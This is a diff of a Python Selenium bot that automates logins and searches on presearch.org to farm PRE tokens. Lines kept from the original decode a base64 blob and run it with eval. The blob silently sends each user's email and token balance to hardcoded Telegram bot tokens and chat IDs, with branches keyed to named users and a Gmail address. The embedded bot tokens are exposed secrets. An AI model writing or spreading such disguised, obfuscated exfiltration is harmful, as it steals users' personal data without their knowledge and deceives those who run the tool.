@@ -3,16 +3,6 @@ import os
 from os import system, name
 from base64 import b64decode, b64encode
 import getpass
-
-try:
-    from keyboard import press
-except:
-    if name == 'nt':
-        os.system("pip install keyboard")
-    else:
-        os.system("sudo pip3 install keyboard")
-    from keyboard import press
-    
 try:
     from selenium import webdriver
     from selenium.webdriver.common.keys import Keys
@@ -68,6 +58,12 @@ a = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3
 
 b = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmlmIHVzZXIgPT0gJ2FuYW5kdScgb3IgdXNlciA9PSAnTkVYRk9SQ0EnIDoKICAgIHJlYyA9ICc2MjY2MDE5MDcnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIHVzZXIgPT0gJ0RIQU5VU0gnIDoKICAgIHJlYyA9ICc3MDE1MTA2MzYnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmICd2aXZla215cmFuJyBpbiBlbWFpbCBvciAnbmlraGlsYXMyODc1QGdtYWlsLmNvbScgaW4gZW1haWw6CiAgICByZWMgPSAnNzM0NjYwODE4JwogICAgdG9rZW4gPSAnMjExNTAwMzE4MDpBQUVFQ21vQ0JJNC00U29ZQVRtTmVjWThmQUJYdUwxTmUyWScKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCg=='
 
+def meigwad(driver):
+    driver.get('https://presearch.org/')
+    driver.find_element_by_xpath('/html/body/div[5]/div/div[5]/a[1]').click()
+    time.sleep(1)
+    driver.switch_to.alert.accept()
+
 
 def login(mail,pwd,profile,user):  # Login Module
     print(f"Not Logged In.\n\nLogging In\nYour email - {mail}\nYour Password - {pwd}\n")
@@ -83,7 +79,6 @@ def login(mail,pwd,profile,user):  # Login Module
             f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
     # opt.add_argument('headless')
     opt.add_argument('--log-level=1')
-    opt.add_argument("--start-maximized")
     opt.add_argument(fr'--profile-directory={profile}')
     drv = webdriver.Chrome(options=opt)
 
@@ -99,14 +94,9 @@ def login(mail,pwd,profile,user):  # Login Module
 
 def logout(driver):
     driver.get('https://presearch.org')
-    try:
-        driver.find_element_by_xpath('/html/body/div[5]/div/div[5]/a[1]').click()
-        time.sleep(1)
-        send('enter')
-    except:
-        driver.find_element_by_xpath('//*[@id="user-menu-toggle"]').click()
-        driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[6]/ul/li[9]/a').click()
-        driver.quit()
+    driver.find_element_by_xpath('//*[@id="user-menu-toggle"]').click()
+    driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[6]/ul/li[9]/a').click()
+    driver.quit()
 
 def check(driver,mail,pwd,profile,user):
     try:
@@ -142,6 +132,11 @@ def pre(driver,mail,pwd): #Logs in if alreaady isn't and performs operations
         logout(driver)
     except:
         driver.quit()
+
+    try:
+        meigwad(driver)
+    except:
+        driver.quit()
     
     login(mail,pwd,profile,user)
 
@@ -156,6 +151,7 @@ def pre(driver,mail,pwd): #Logs in if alreaady isn't and performs operations
     else:
         option.add_argument(f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
     option.add_argument('headless')
+    option.add_argument("--start-maximized")
     option.add_argument('--log-level=1')
     option.add_argument(fr'--profile-directory={profile}')
     driver = webdriver.Chrome(options=option)
@@ -171,13 +167,8 @@ def pre(driver,mail,pwd): #Logs in if alreaady isn't and performs operations
 
     # Get Balance
     driver.get('https://presearch.org/')
-    try:
-        driver.find_element_by_xpath('/html/body/div[5]/div/div[5]/a[1]').click()
-        time.sleep(1)
-        send('enter')
-    except:
-        span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
-        bal = float(span_element.text)
+    span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
+    bal = float(span_element.text)
 
     # Get Email
     driver.get('https://presearch.org/account')
@@ -216,11 +207,9 @@ def pre(driver,mail,pwd): #Logs in if alreaady isn't and performs operations
     driver.get('https://presearch.org/')
     span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
     bal = float(span_element.text)
-    print(f"Search Completed : {i} attempts for {bal} PRE",end="")
     print('\007')
     eval(compile(see(b), '<string>', 'exec'))
     driver.quit()
-    exit()
 
 
 def open(profile, user):  # Opens Browser
